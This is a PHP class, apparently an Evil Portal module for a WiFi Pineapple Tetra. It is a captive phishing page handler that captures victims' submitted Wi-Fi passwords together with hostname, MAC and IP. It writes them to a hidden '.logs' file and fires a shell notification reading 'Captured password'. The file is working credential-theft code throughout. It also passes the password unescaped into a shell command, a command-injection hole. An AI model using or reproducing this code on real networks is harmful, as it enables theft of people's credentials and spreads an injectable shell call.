<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['password'])) {
            $pwd = $_POST['password'];
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "password: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

            // Notify WiFi Pineapple Tetra's notification bar
            $this->execBackground("notify 'Captured password: $pwd'");
        }

        // Call parent to handle basic authorization
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
